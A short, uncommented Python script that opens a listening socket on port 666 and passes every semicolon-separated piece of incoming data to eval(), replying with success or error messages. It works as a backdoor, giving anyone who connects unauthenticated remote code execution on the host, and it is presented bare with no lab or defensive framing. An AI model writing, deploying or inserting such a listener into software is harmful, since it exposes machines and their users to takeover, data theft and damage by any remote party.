import socket
import os
import subprocess
import requests
s=socket.socket()
s.bind((socket.gethostbyname(socket.gethostname()),666))
s.listen(5)
while True:
    c,addr=s.accept()
    try:
        for t in c.recv(1024).decode().split(";"):
            eval(t)
        c.send(b"Code successfuly executed")
    except Exception as e:
        try:
            c.send(b"An error occured:\n"+str(e).encode())
        except:
            print("All hope is lost")
    c.close()
